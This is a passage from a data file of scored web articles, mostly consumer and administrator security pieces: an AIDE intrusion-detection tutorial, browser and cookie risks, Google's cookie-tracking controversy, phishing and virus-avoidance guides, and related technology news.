        "text": "Front-line measures like firewalling, strong authentication, and staying on top of security updates are mandatory steps to keeping your system secure. But you also need to check your system's health frequently and make sure a compromise didn't slip past you unnoticed. A good place to start is with an intrusion detection system (IDS) that monitors your machine's resources and flags any changes that might indicate an intruder or a rootkit. The Advanced Intrusion Detection Environment (AIDE) is an open source IDS that you can set up in a weekend. Before we get started, though, it's vital to understand how an IDS like AIDE functions. AIDE is a host-based IDS, which basically means that it scans the filesystem and logs the attributes of important files, directories, and devices. Each time it runs, it compares its findings against the previous, \"known good\" data, and alerts you if something has changes. But the downside is that if your system is already compromised before you install and run AIDE initially, you won't be able to detect it. Of course, the odds that your system is already compromised aren't high, but the fact remains that the only way to guarantee that it is clean is to install and run AIDE right after you install the OS, but before you connect to the network. Put that on your to-do list when deploying new machines from now on, and as for your existing Linux boxes, make do as best as you can. AIDE runs on Linux and most other Unix-like operating systems. It is provided by most of the distributions, but you may want to consider grabbing the code from the project's Web site and compiling from source — there are a few advanced options that are only available at compile-time via the ./configure script. If you've already installed an AIDE binary, run aide -v, which will dump out the version number and the compile-time options used. For now, though, we'll talk about the basic installation and usage. Setup and First-Run AIDE works its magic by reading in a configuration file that contains both a list of directories and files to scan, and the attributes of each entry to log. It then works its way through the tree of nodes to be scanned, and writes out a database of the attributes found. There are currently thirteen attributes that AIDE can log — including permissions, owner, group, size, all three timestamps (atime, ctime, and mtime), plus lower-level stuff like inode, block count, number of links, and so on. On top of those, AIDE supports multiple has algorithms with which it can generate checksums for each file. By default, the list includes MD5, SHA-1, SHA-256, SHA-512, RMD-160, Tiger, HAVAL, and CRC-32. If you compile AIDE with the mhash option to the configuration script, you can also use GOST and Whirlpool hashes. Binary packages probably include a decent example configuration file in /etc/aide/aide.conf — in a bit, we'll explain why you might want to use a different location, but for the moment, open the file in an editor, and take a look at the configuration directives. Near the top are rule definitions, which are just user-supplied names followed by an equal sign and a list of attributes and hashes. For example: SizeOnly = s+b SizeAndChecksum = s+b+md5+sha1 ReallyParanoid = p+i+n+u+g+s+b+m+a+c+md5+sha1+rmd160+tiger+whirlpool The first line activates just the size (s) and block count (b) attributes. The second adds MD5 and SHA-1 hashes, and the third logs just about every supported feature, including inode (i), timestamps (m, a, and c) and a fistful of additional hashes. Below these rule definitions you'll find a lines listing the directories and files to check, using regular-expression based formulas. For example: /etc SizeAndChecksum /sbin ReallyParanoid /var Size !/var/log/.* !/var/spool/.* The first three lines are \"positive\" expressions, which tell AIDE to include everything that matches the regular expression. The leading exclamation point on the last two indicate a \"negative\" expression, which in this case says to exclude the rapidly-changing /var/spool/ directories. As you can see, each positive expression is followed by the name of one of the rule definitions. You could also use a literal string instead of a rule name here, such as /var/www/intranet p+s+b+a+sha256 — the rule names are just for easier reading. Correctly defining your regular expressions and rules is the trickiest part of using AIDE. Too many files and directories, and you can end up with extremely long logs to read through on every integrity check. Too narrow of a set, and you risk missing an intruder. It's also not trivially easy to get the right balance of regular expression syntax when you want to match some files in a directory hierarchy, but not others. It's a good idea to consult the AIDE user manual and read man aide.conf for help combining wildcards with positive and negative expressions. Of course, there's no substitute for actually trying out your configuration with a real run. Run sudo aide --init, and AIDE scans the designated files and directories, writing its findings to a database. The location of the database is determined by a line of the form database=URL in the configuration file. The data is also copied to stdout, so you can watch the process from a terminal window. If you're missing some files and need to tweak your expressions, you can do so and re-run the process before proceeding. Comparing Subsequent Checks Now comes the important (and potentially confusing) part. Time goes by, and whenever you feel it's prudent, you decide to run another scan with sudo aide --check. Except that unless you specify otherwise, AIDE looks for a configuration file in the current working directory — which raises the question of where you should keep that all-important configuration file. At first glance, it might seem like you should store it in a standard location like /etc/aide/, but that's actually a bad idea, because if your system ever was cracked, intruders could not only read your AIDE configuration and look for directories that you've elected to ignore, but they could alter the URL of the output database in order to trick subsequent AIDE scans. So the best plan is, in fact, to store the aide.conf file on removable media (preferably read-only), that you mount just before running a scan. For similar reasons, the safest place to store AIDE's output database is also on this removable media, so inside the configuration file the database line might be database=/media/AIDE_CD_012345/aide.db. You tell AIDE where the configuration file is with the --config command-line parameter. Thus, the correct scan command to run is (in this example) sudo aide --check --config=/media/AIDE_CD_012345/aide.conf. If someone replaces your copy of /sbin/fsck, the second scan should notice it and report it to you on stdout. On the other hand, you may have good reason to alter a system file like /etc/pam.conf yourself, in which case you don't need AIDE throwing a red flag every time you run a scan. You can invoke AIDE as sudo aide --update --config=/path/to/your/aide.conf to both run a scan and output an updated copy of the database. AIDE will save the new database at the URL you specify in the configuration file after database_out=. If you're following proper protocol, this will be someplace mounted read-write, and you will subsequently copy the new database to your read-only media. So how often should you run scans? It depends on the machine. On the plug-computer that runs your house's lighting control and sprinkler system, rarely. On the company's Internet gateway, daily at least. Extra Credit: ACLs, SELinux, and Database Signing As you've probably realized, all AIDE can do is alert you to changed files. The ball is in your court to recognize whether the change is a sign of a security breach. Some system files should never change; some (such as tty devices) change owner and permissions during regular operation. You have to get to know your system. Depending on your system, you may not find the generic AIDE binaries supplied by your distribution up to the task. That is because there are a few attributes that AIDE can monitor only if they are configured as compile-time options, such as support for SELinux's security contexts, access control lists, and extended file attributes. If you need any of those features, you'll want to compile AIDE yourself from source. Luckily it's not hard; the standard GNU compiler chain is all that is required. As mentioned above, the compile-time options also include support for additional hash algorithms. Which you prefer is largely a matter of personal mathematical preference. But there is also one other compile-time option that you should consider if you want a really secure setup. Configuring AIDE with HMAC (hash-based message authentication code) support allows you to cryptographically sign both the configuration file and the output database. This is a compile-time option, not a run-time option, because adding it in prevents the aide binary from running a scan in the event that the signature of the config file or database doesn't match. That's what you want: a binary that cannot be tricked into using a compromised database. Because let's face it — the read-only media you're using is only as secure as the locker you store it in. To configure AIDE with HMAC support, read the final section of the AIDE online manual. You'll need to pick a pair of encryption keys, but otherwise it's a fairly simple process. After that, it's sit back and scan-as-usual.",
        "prob": "tensor([[2.0965e-06, 1.0000e+00]])"
    },
    {
        "text": "Many a time users forget that browsers are in fact just programs like a game or a photo editor, with the ability to connect us any local network or the World Wide Web. Simply because we may be visiting a secure site, or are browsing a secure location does not mean that we are automatically safe from the many threats there are online, as our browsers as well can fall prey to hackers and the like. In fact it is this misunderstanding which has led internet browsers to become one of the most popular routes through which users can be targeted. Cookies are another interesting thing that you should be aware of. The cookies which are stored on your hard drive are in fact little packets of data that were sent from a specific website and contain information related to that website, the purpose is, that the next time your decide to visit the same web page the information from that page is already present on your computer and hence loading up the site is done much more rapidly. Cookies themselves are designed to hold information related to that website, however, people out there looking to do you harm can manipulate the cookie to store more than just information of that site itself. For example cookies that can track your online behavior and patterns. Another way that cookies can be rather dangerous is through an approach called packet sniffing, as the cookies are packets of data, hackers and others trying to steal information don’t have to hack your computer, rather they can intercept and sniff the information sent out from your computer in the little packets we call cookies, with software such as Firesheep. By making sure that you are running and storing safe cookies you can help protect yourself from packet sniffing and other such problems. Another thing that can compromise your security is running an out of date browser version. The reason why browsers have newer versions is simply because there are always errors and bugs that the developers are always trying to uproot and correct, the newer version of your browser contains many security updates which will protect you from newer viruses, viruses which your old version can be infected with. Another good addition to an updated browser version is using an anti-virus which also scans your browser and protects you from online threats. This combination should provide you with a very good safety measure; however anti-spyware software to run with your browser is also not a bad addition. And all three working for you simultaneously should have you covered from most places that you may visit online. The other routes through which your computer can be compromised are the plug-ins that run on your browser for example the flash player which is used to play videos. These are things that are built in to your browser and the best solution is to use only those which are necessary. Image Courtesy: wktconnection",
        "prob": "tensor([[3.9636e-05, 9.9996e-01]])"
    },
    {
        "text": "Who's Tracking When You're Browsing? Online privacy was in the headlines recently when news broke that Google bypassed privacy settings in Apple's Safari browser and Microsoft's Internet Explorer browser to install cookies to track activity. The stories stirred up concerns among users about what information is being collected about them. Let's first review what a cookie is and what it does. Cookies are small files that websites can place on a hard drive to do things like identify returning visitors, personalize content displayed, and store items in shopping carts. They are also used for data collection to determine usage statistics. Jumping Through a Loophole in Safari Researchers discovered that Google bypassed the privacy settings in Safari by exploiting a loophole. It involved tricking the Safari browser into allowing it to install cookies to serve ads with a tie-in to its Google Plus social network — adding a +1 button to ads for users to click if they approved of them. Because of another quirk in Safari, this opened the door for additional Google cookies to be installed, potentially allowing wider tracking. Google's response was that it used known Safari functionality to provide features for people who were signed into Google services. Enabling the installation of additional cookies was unintentional, it said, so the company started removing these cookies from Safari browsers. Google also noted that the cookies do not collect personal information. Exploring What Happened With Internet Explorer Shortly after the Safari loophole was announced, Microsoft discovered that the privacy preferences of Internet Explorer's users were also being circumvented by Google. Microsoft said Google was getting around a privacy safeguard in its Internet Explorer 9 browser that helps users prevent advertisers from placing cookies on their computers. Here's how it happened: IE9 blocks sites from installing cookies for other sites so Google.com shouldn't be able to install a cookie for its advertising arm, DoubleClick.com. The exception is that IE9 does allow sites to install third-party cookies if they flash a kind of \"digital ID card\" called P3P (Platform for Privacy Preferences). P3P relies on sites like Google to volunteer a description of themselves, including what will be done with data gleaned from tracking users. Any site that refuses to describe itself to Microsoft's browser gets a tracking cookie anyway. In other words, the system only blocks sites that explicitly identify themselves as advertisers. Those that don't identify themselves at all can slip through. Take Action to Guard Your Privacy What steps can you take if you're concerned about browser tracking? Web browsers have settings that allow you to manage at least some tracking activity by setting your cookie preferences, and you can also choose to delete certain cookies. Simply follow the tutorials included here.",
        "prob": "tensor([[2.1071e-06, 1.0000e+00]])"
    },
    {
        "text": "Cloud Computing: CNBC Explains Senior Editor, CNBC To hear the experts tell it, cloud computing may be the most innovative technology development in decades, or should be dismissed as a marketing tool for existing know-how that's as old as computers themselves. We can't settle the debate on the uniquene ss of cloud computing, but there are some issues that can be resolved without controversy: just what is cloud computing, who uses it, and what are the benefits and risks? What is Cloud Computing? The official definition from the National Institute of Standards and Technology reads: \"Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g., networks, servers, storage, applications and services)that can be rapidly provisioned and released with minimal management effort or service provider interaction.\" Translation? Accessing the Internet anywhere, anytime and being able to use any or all of the data and applications that you want. \"Consumers don't completely understand it yet and there's been a lot of hype, but it's having your data or software stored somewhere besides your PC or Mac and being able to get it through the Internet,\" explains Chris Geiser, CTO of The Garrigan Lyman Group, a digital marketing and advertising agency. When the technical jargon is stripped away, cloud computing can be grasped on its basic level— anytime, anywhere computing—without the user ever having to know much about the technology. How Does It Work? In simplest terms, cloud computing involves delivering hosted services over the Internet. The service end is where the data or software is stored and the user end is a single person or company network. \"Cloud computing minimizes the hardware, like memory, and application requirements, like word processing, for the users and pools those resources in the 'cloud,\" says Danny McPerson, CSO of Verisign . So, a company in the business of hosting has specified data stored on its servers, a user fires up their computer, connects to the web (and to the servers holding their data), clicks on their application software and away they go. What gets somewhat mind-numbing are the kinds of storage systems services used in cloud computing. There are three basic 'alphabet soup' levels of storage capabilities, but there's no real need to go into those here. Any or all three can be offered by the same provider—for a price. And there are so-called public, private or hybrid clouds; public meaning the data is accessible to anyone, private being subject to a company's firewall or security system, and hybrid, which combines both public and private. But it's fairly safe to say that most users are more than likely to be content knowing their data is stored somewhere other than their computer and they have access to it whenever and whereever they go online. Who Uses Cloud Computing? You are probably using it right now. If you use email, or go to a social network and post photos, access online document software, or use your company's hardware/software, you're probably using the cloud. You may also use it to store online tax or financial records. You can also use cloud computing to back up files for storage off your PC or Mac. Businesses such as hotels use it for consumers to make reservations and a major electronics retailer is using it to fill their online orders. Sending a picture to a Facebook friend today? You are headed for the clouds. Where Did Term Cloud Computing Come From? The concept of cloud computing dates back to the 1960's. The phrase originates from the cloud symbol used by flow charts and diagrams to symbolize the Internet. The diagram to the left underscores the idea that any computer connected to the web has access to a pool of computing power, applications and files. The first reported public use of the term came in August of 2006 at a search engine conference in San Jose, Calif. when then Google CEO Eric Schmidt described one approach to data storage as \"cloud computing.\" But in a sign of the ever-competitive Internet wars, research shows that Schmidt may have been trying to pre-empt Amazon,which was about to release its Elastic Compute Cloud system later that month. Who Provides Cloud Computing Services? Dozens of firms are providing 'clouds' in the U.S. and other countries. They generally fall into three categories of service: software, storage and computing power, or platform providers that give site developers tools to build and host applications. Some do all three. Big or small, all see this as a natural way to make money in a very competitive field. Some names might be surprising as they may be better known as content providers or consumer sites. Here are just a few of the major players: Amazon: considered one of the innovators in cloud computing since it began offering services in 2006. Amazon has thousands of small business and individual users along with customers like the New York Times and Eli Lilly . Google: in what might have been a strike again Microsoft , the internet search giant launched Google Apps in 2007. Customers include small businesses and colleges like Northwestern University. Microsoft: the tech giant has made its windows operating system available with cloud computing through the Azure program. Microsoft also offers various business services. Customers using the program include Epicor and Micro Focus. NetSuite: founded by Oracle CEO Larry Ellison, NetSuite offers web based applications for small businesses including Wolfgang Puck Coffee. Salesforce.com: started in 1999, Salesforce is considered a pioneer in cloud computing, with its software as a service product. Customers include financial services, media and health firms as well as retail companies. GoGrid: the Canadian based firm is a division of ServePath. It's said to be one of Amazon's chief competitors in cloud storage. Customers are mostly start-up firms and a few bigger companies like Novell.",
        "prob": "tensor([[2.4673e-06, 1.0000e+00]])"
    },
    {
        "text": "Gauss malware, Apple iPhone show what encryption can do Some of the most sound advice for securing sensitive information, whether it be in an e-mail, on a mobile device or at rest in a database, involves encryption. Simply put, encryption can keep data safe, for good or ill, as a couple recent examples illustrate. After researchers at Kaspersky Labs come across Gauss, the latest in the Stuxnet/Duqu/Flame state-sponsored malware chain, and started examining it, they ran into a problem. The malware contained an encrypted “warhead” that the researchers couldn’t crack. Gauss has a module called “Godel” (many of the malware’s components are named after famous mathematicians) with a payload of unknown purpose. “Despite our best efforts, we were unable to break the encryption,” researchers said in a blog post. Stuxnet/Flame/Gauss and the limits of cyber espionage Mobile security guide catches up with smart phones, BYOD So Kaspersky offered up all of its information on Gauss and asked “anyone interested in cryptology and mathematics to join us in solving the mystery and extracting the hidden payload.” A long list of people have contributed ideas, but as of this writing the warhead remains a mystery. Gauss was discovered infiltrating systems in the Middle East, primarily in Lebanon, and is believed to be part of a U.S.-led cyber warfare program that includes Stuxnet and Flame, both of which were found mostly attacking systems in Iran. U.S. officials likely are hoping Gauss’ encryption holds up. The investigation into Gauss might illustrate how cyberspace differs from traditional battlegrounds. During, say, the Cold War, if scientists found an unfamiliar warhead they probably wouldn’t make a public project out of taking it apart and seeing what’s inside. But the Gauss investigation also shows the power of encryption -- be it in malware, in industrial systems in computers or even phones. Agencies should take note of how encryption protects data, particularly as they try to manage security for mobile devices that can be lost or stolen. Law enforcement officials worry that good encryption could hurt their chances of retrieving forensic evidence against suspected criminals, but that same protection could also be applied to devices being carried by government employees. Apple, for example, has improved the security on the iPhone to the point that it could leave law enforcement at a disadvantage against criminals who carry them, Simson L. Garfinkel writes in Technology Review. The most significant of Apple’s security steps for the iPhone is the addition of the Advanced Encryption Standard, a U.S. government standard since 2001 and considered to be unbreakable, Garfinkel writes. And the iPhone’s tightly knitted architecture makes it easy for users to apply the encryption. And of course, encryption tools are available for Android and other mobile devices. \"I can tell you from the Department of Justice perspective, if that drive is encrypted, you're done,” Ovie Carroll, director of the cyber-crime lab at the Justice Department’s Computer Crime and Intellectual Property Section, said at a recent conference, Garfinkel reports. “When conducting criminal investigations, if you pull the power on a drive that is whole-disk encrypted, you have lost any chance of recovering that data.\" Law-abiding users, however, can let law enforcement officials and the courts worry about criminals’ phones. Instead, agencies deploying smart phones and tablets or allowing them as part of BYOD programs could take note of how well a good encryption program works.",
        "prob": "tensor([[2.0833e-06, 1.0000e+00]])"
    },
    {
        "text": "WASHINGTON — Kids have easy and inexpensive access to hundreds of smartphone applications, but parents are in the dark about what personal information is being collected from their children and how companies are using the data, government regulators said Thursday. The Federal Trade Commission said companies that make mobile apps, and the stores that sell them, should be providing parents with basic, simple-to-understand information about their products so they can choose which apps their children can use. The report also says developers should disclose whether their apps connect with social media services or include advertisements. Mobile apps can automatically capture smartphone information, such as a person’s location, phone number, call logs and personal contacts. The market for mobile apps has exploded over the past few years, according to the FTC. In 2008, there were about 600 apps available to smartphone users. Now there are hundreds of thousands that have been downloaded more than 28 billion times, the commission said. “This rapidly growing market provides enormous opportunities and benefits for app users of all ages, but raises questions about users’ privacy, especially when the users are children and teens,” the report by the FTC staff said. Using the word “kids,” FTC staff searched online app stores and examined pages promoting apps for word games, math and number games, and entertainment. Most of the product descriptions stated that they were for use by children. Prices for the apps ranged from free to $9.99. “But most apps were $0.99 or less, and free apps were overwhelmingly the most frequently downloaded,” the report said.",
        "prob": "tensor([[3.9623e-04, 9.9960e-01]])"
    },
    {
        "text": "ARCHIVED: Avoiding computer viruses Computer viruses implant instructions in other programs or storage devices and can attack, scramble, or erase computer data. The danger of computer viruses lies in their ability to replicate themselves and spread from system to system. Few computing systems are immune to infection. On this page: The following activities are among the most common ways of getting computer viruses. Minimizing the frequency of these activities will reduce your risk of getting a computer virus: - Freely sharing computer programs and system disks, or downloading files and software through file-sharing applications such as BitTorrent, eDonkey, and KaZaA - Clicking links in instant messaging (IM) that have no context or have only general text; for more information, see What should I do if my computer is infected with an instant messaging (IM) Trojan? - Downloading executable software from public-access bulletin boards or web sites - Using your personal disk space with public computers or other computers that are used by more than one person - Opening email attachments from people you don't know or without first scanning them for viruses; for more information, see ARCHIVED: Using Symantec/Norton AntiVirus Corporate Edition, how do I immediately scan a file, folder, or drive for viruses? and ARCHIVED: Using Norton AntiVirus for Mac OS or Mac OS X, how do I immediately scan a file, folder, or drive for viruses? - Opening any email attachment that ends in .lnkon a computer running Microsoft Windows (At Indiana University, UITS blocks certain attachments that commonly harbor viruses from being delivered via email; for more information, see At IU, what types of attachments are blocked from my email account?) - Continually running your Windows computer as an administrator; for more information, see ARCHIVED: In Windows, why should I avoid running my computer as an administrator? How to avoid computer viruses Following are some recommendations for safe computing: - The most important thing you can do to keep your computer safe is to install virus detection software and keep the virus patterns up to date. Antivirus programs perform two general functions: scanning for and removing viruses in files on disks, and monitoring the operation of your computer for virus-like activity (either known actions of specific viruses or general suspicious activity). Most antivirus packages contain routines that can perform each kind of task. Note: The University Information Security Office (UISO) recommends that you run the latest version of Symantec virus protection software (available to IU students, faculty, and staff free of charge via IUware) for your operating system; See In Windows, how do I safely upgrade to the latest Symantec Endpoint or AntiVirus software? Be sure to upgrade safely, update your virus definitions daily, and scan your computer weekly. Check the software help for instructions. - Keep your operating system current with the latest patches and updates. The writers of viruses and worms often exploit bugs and security holes in operating systems and other computer software. Software manufacturers frequently release patches for such holes. For information on obtaining the latest patches, see ARCHIVED: For Windows, how can I get software updates and patches? and ARCHIVED: For Mac OS X, how do I obtain and install system software updates? - Back up your files. Viruses are one more very good reason to always back up your files. Note: If you back up a file that is already infected with a virus, you can re-infect your system by restoring files from the backup copies. Check your backup files with virus scanning software before using them. - Keep your original application and system disks locked (write-protected). This will prevent the virus from spreading to your - If you must insert one of your application disks into an unknown computer, lock (write-protect) it first, and unlock your application disk only after verifying that the machine is virus-free. - Obtain public-domain software from reputable sources. Check newly downloaded software thoroughly using reputable virus detection software on a locked floppy disk for any signs of infection before you copy it to a hard disk. This can also help protect you from Trojan horse programs. - Quarantine infected systems. If you discover that a system is infected with a virus, immediately isolate it from other systems. In other words, disconnect it from any network it is on and don't allow anyone to move files from it to another system. Once the system has been disinfected, you can copy or move files. - If you use a desktop version of Outlook, minimize use of the preview or reading pane feature. Last modified on August 30, 2010.",
        "prob": "tensor([[0.3016, 0.6984]])"
    },
    {
        "text": "In the vast universe of IT, data is categorized as being either structured or unstructured, from a macro perspective. Generation of unstructured data is orders of magnitude higher than that generated in structured formats, and this poses major challenges in terms of storage and processing and analytics. Such large amounts of data collectively form what is known as big data, the handling of which is usually beyond the capability of traditional relational database management systems (RDBMS). As RDBMS has been the preferred method for storing, warehousing, and analyzing structured data, the industry has matured in the analysis of mainly structured data. Ignoring unstructured data is inadvisable, as effective analytics is today a key business differentiator. Organizations are exploring all possible sources of data to develop intelligent big data analytics systems that can provide deeper insights for informed decision making. Technologies such as Hadoop and specialized non-relational databases such as columnar databases, graph databases and document databases are being widely implemented to store and process unstructured big data for analytics. MapReduce is the distributed data processing and querying engine to extract data from big datasets hosted on compute clusters in any typical Hadoop implementation. Structured Query Language (SQL) has been the de-facto standard for querying data out of RDBMS systems. RDBMS systems are generally known to hold data spanning terabytes in any typical warehousing environments. But when systems hosting unstructured data come into picture, the size of the data would scale to a minimum of hundreds of petabytes, thus qualifying as big data. Currently, systems with structured and unstructured data are operated in mutually exclusive mode without any interoperability. Organizations need to explore and exploit the intelligence hidden in unstructured big data, with suitable big data analytics. Nevertheless, dependence on RDBMS for existing lines of business applications would continue. The challenge is to implement a big data analytics solution that can analyze structured as well as unstructured big data using a common interface. Integrated heterogeneous data processing using SQL and MapReduce in parallel In a consolidated view of big organizational data, the weightage of relational data is no more than a modest-sized source system, when compared with unstructured data. In the context of this growing need, vendors are enhancing MapReduce data processing engines that can provide operating interface extensions to access structured data from relational databases using SQL. RDBMS vendors are rolling out drivers for interoperability with Hadoop environments to bridge the connectivity between MapReduce and SQL. Due to conscious interoperability efforts made by MapReduce/Hadoop vendors, as well as RDBMS vendors, big data analytics over heterogeneous data is becoming a reality. Greenplum MapReduce is one example of the potential of big data analytics. A data flow engine driven by Greenplum’s MapReduce can query big sets of unstructured data (petabyte-scale) using parallel computing as well as query structured data from relational databases using JDBC / ODBC drivers. Technically, thus, all relational databases that support JDBC / ODBC can be queried using this parallel data flow Applications of analytics over big heterogeneous data As the nature of data in structured and unstructured formats is different, the kind of analysis that can be done over this data is also different. With integrated big data analytics capable of sourcing data from any big data sources, applications can extract the deepest level of intelligence from the entire organizational data. For example, consider a manufacturing unit in the FMCG segment. In the regular course of business operations, it would have big data generated from procurement of commodities; product manufacturing; brand promotion and product marketing; direct and indirect sales; customer care; sales support centers, and so on. Suppose that this company is publicly listed. Sales, procurements, stock inventory, incidents, and service requests would all be in structured data formats. Quotation negotiations, detailed readings from manufacturing instruments, online logs of user clickstreams on product advertisements, users’ feedback requests, and grievances recorded with support centers, daily stock feeds from stock exchanges, would all be stored in unstructured formats. All this amounts to big data and requires big data analytics techniques. Pattern recognition and gap analysis are the immediate value additions that big data analytics can extract from heterogeneous data. With all these data sources analyzable using a single big data analytics solution, complex data analytics is now possible. For instance, one can analyze how a particular resource has a cascading impact on manufacturing performance, sales performance, customer reactions, CRM costs, and finally fluctuation in stock value. This pattern recognition using time series analysis can help identify gaps in processes. Also, direct and indirect association and impact of various key parameters of different business operations can be analyzed when all the data sources that form the organizational data are analyzable with big data analytics. SQL and MapReduce are likely to become the preferred querying mechanism for such big data analytics. About the Author: Siddharth Mehta works as an associate manager and a technical architect for BI software projects at Accenture Services. He is a recipient of Microsoft’s Most Valuable Professional award, and has written extensively on Microsoft BI software on his blog. Prior to Accenture, Mehta was in Capgemini. This was first published in August 2011",
        "prob": "tensor([[2.9265e-06, 1.0000e+00]])"
    },
    {
        "text": "Spam and Phishing Emails Phishing emails are messages sent by individuals trying to \"fish\" for personal or financial information. Phishers are getting better every day at making their messages look authentic. There are two types of phishing emails: - Emails that ask you to reply to the message with confidential information, such as your user ID and password. Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email. - Emails that ask you to click on a link to a web page, which then asks you to provide confidential information. Many times these web pages look like legitimate sites, such as Bank of America or PayPal, but they are not. When you provide your user ID and password, this information is captured by the phisher, who can then use it to log into the legitimate site. What to do if you get a phishing email - Send any phishing emails you receive, including its full header information, to firstname.lastname@example.org. - If you suspect it may be a phishing email, UIT Security can review the message and advise if it is legitimate or not. - If you know it is a phishing email, UIT Security can take measures to have the phishing web site taken down. - Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email. - Use your mouse to hover over links in an email. This will show you the actual website you will be directed to if you click on the link. It is always best to type the address yourself into your web browser, rather than clicking a link in an email. How to identify a phishing email - May show the sender on behalf of someone, such as the University of Houston and generally do not contain the sender's email. - May contain fuzzy logo symbols which are not genuine. - May not contain email signatures or any contact information. - May have bad grammar and capitalization. - Generally require you to take quick action, such as verifying your account to prevent it from being deactivated. Be particularly vigilant during holidays or significant events since attackers heighten their activity during these times. How to Protect Yourself Here are some best practices that will help protect you and your information: - Beware of messages that claim your account has been suspended. - Be suspicious of any email with urgent requests for personal financial information. - Never click on a link in an email. Instead, always type the legitimate Web address of the site you want to reach directly into your Web browser. - Be suspicious of email messages and other electronic communications from sources you do not know or recognize - Use the latest versions of your operating system (OS) and applications. - Have the latest security software updates (patches) installed. This includes patches for your OS and applications. - Keep your anti-virus software up to date. - Report any suspicious emails",
        "prob": "tensor([[2.1447e-06, 1.0000e+00]])"
    },
    {
        "text": "Google: A New Tool For U.S. Intelligence?http://www.npr.org/2011/03/25/134666365/a-new-tool-for-u-s-intelligence-google Traditionally, intelligence agencies have relied on top-secret information to track changes in other countries. But wiretaps and secret intercepts didn't help U.S. officials predict the Arab Spring that has brought revolution across the Middle East and North Africa. In hindsight, officials say they could have found some clues about what was about to happen if they had read open sources more closely. Now they are searching for systematic ways to do that. The uprisings in the region have shown intelligence officials that they need new ways to understand what motivates people around the world. While traditional intelligence tools can help, they are limited in their ability to put their fingers on the pulse of society or anticipate fickle human behavior. \"The traditional intelligence community is absolutely biased toward classified information,\" said Lt. Col. Reid Sawyer, an Army intelligence officer and head of West Point's Combating Terrorism Center. \"I think that open source provides a critical lens into understanding the world around us in a much more dynamic way than traditional intelligence sources can provide.\" Open sources include newspapers, local radio shows and, of course, Facebook and Twitter. The problem, intelligence officials will tell you, is tapping into all of that in a systematic way. Predicting Political Unrest Gabriel Koehler-Derrick, an instructor at West Point, and Joshua Goldstein, a researcher at Princeton University, think they may have at least a partial solution. They are seeing if they can tap into the mood of the country by tracking what its citizens are searching for online. And the way they do that is by using the search engine Google Trends. \"What we did was a comparison of search terms over time starting from the moment the Internet was plugged back in by the government of Egypt on Jan. 25, and moving forward for a period of about 30 days to see what we could find out,\" Koehler-Derrick says. As he saw it, it was an electronic way of taking a very broad poll. Google Trends is basically a way of looking at what people are focusing on by mapping out their Google searches. Marketing firms have been using Google Trends for some time. The government has, too. Back in 2009, during the swine flu epidemic in the U.S., the National Institutes of Health used Google Flu Trends to track outbreaks of the disease. It turns out that when people started to feel feverish and nauseous, they would go to Google to check out their symptoms. While it wasn't a perfect indicator, Google Flu Trends often beat government predictions about flu outbreaks by a week or more. Imagine using the Internet to do the same thing in predicting political unrest. Understanding The Mood Of A Country \"Google Trends allows us to get a sense of atmospherics,\" Koehler-Derrick says. \"There are approximately 16 million Internet users in Egypt. Now, this is undoubtedly a demographic that is biased toward younger people. If you put Google's market share at 10 percent, which I think is absurdly low, then that is 1.6 million users that we have essentially surveyed for 30 days.\" He and Goldstein searched Google using Arabic because that would better measure what locals are interested in. Using the search term \"Tunis,\" they wanted to see how many Egyptians were following the demonstrations in Tunisia. They compared the number of Google searches for \"Tunis\" with the number of Google searches for pop stars in Egypt. \"Typically, as I think you'd find in the United States, pop stars trump almost any search you can think of,\" Koehler-Derrick says. \"But the search for Tunis prior to the demonstrations that kicked off in late January were surprisingly high.\" Sawyer says this kind of information is vital to understanding the mood of a country and would supplement the kind of information gleaned from more traditional intelligence methods. Consider the debate raging in Washington, D.C., about the Muslim Brotherhood as the revolution unfolded in Egypt, he says. There were concerns in the U.S. intelligence community that the Muslim Brotherhood, an Islamic political group, might come to power. \"If the decision makers could have understood how little the Muslim Brotherhood was animating the online searches inside of Egypt,\" Sawyer continued, \"how might it have led to different decisions or different discussions, at least, that were being held in the halls of Washington?\" In other words, few seemed interested enough in the Muslim Brotherhood to search for them on Google. So how much of a role could the group have been playing in day-to-day conversations in Egypt? Still, Google Trends can't predict the future. But it could be one more tool for intelligence officials who want to tap into the private conversations that could spark popular movements.",
        "prob": "tensor([[2.7989e-06, 1.0000e+00]])"
    },
    {
        "text": "Proactive parents and teachers can help keep kids safe online (BPT) - If your teen is among the 93 percent of 12- to 17-year-olds using your family’s laptop, smartphone or tablet to surf the Internet, they are vulnerable to multiple cyber threats, many of which could be detrimental. Moreover, teens do not realize the abundance of threats awaiting them, nor do they recognize a tweet or photo upload can impact not only their reputation and future, but their safety, as well. Microsoft’s research shows that 55 percent of teens say they give little or no thought to the consequences of posting something online. And, according to a recent survey, 1 in 4 parents are overwhelmed by technology and just hope for the best. “As hackers continue plotting attacks, the increase in vulnerability among teens is likely, but parents may not realize they are actually the first line of defense in keeping their families safe online,” says Linda McCarthy, cyber security expert, former senior director of Internet safety at Symantec and author of Own Your Space: Keep Yourself and Your Stuff Safe Online. The increase in prospective cyber threats provides opportunities in the career field of cyber security. If your teen enjoys spending time online, it’s never too early to begin discussing the education required to enter this field. Cyber security related fields are projected to grow more than 28 percent by 2020, according to the U.S. Bureau of Labor Statistics. DeVry University, which has partnered with McCarthy to provide complimentary copies of the Own Your Space eBook to parents, teachers and teens, recognizes the growing need for professionals with the skills required to protect individuals and organizations from cyberattacks. By also partnering with technology leaders like Cisco and Microsoft, its students are provided with a mix of relevant theoretical and hands-on education. For concerned parents and teachers, McCarthy offers the following advice to help protect teens online: 1. Protect equipment. Install and update antivirus software, spyware protection and firewalls. 2. Realize social networking sites are here to stay. Review your teen’s Facebook and Twitter profiles. Make sure they do not display personal information such as full names, addresses or school names. 3. Boost password strength. Utilize a mixture of letters, numbers and characters. And most importantly, never share passwords with anyone. Cyber security is a moving target, and as threats develop daily, it’s imperative for parents and teachers to educate teens about these dangers. “The goal is to inform and educate teens, not scare them about the dangers of sharing information online,” says McCarthy. “By protecting your family’s devices and empowering teens with the information needed to recognize impending threats, cyber sabotage is avoidable.” To download a complimentary copy of Linda McCarthy’s eBook, Own Your Space: Keep Yourself and Your Stuff Safe Online, visit DeVry.edu/OwnYourSpace.",
        "prob": "tensor([[2.0557e-06, 1.0000e+00]])"
    },
    {
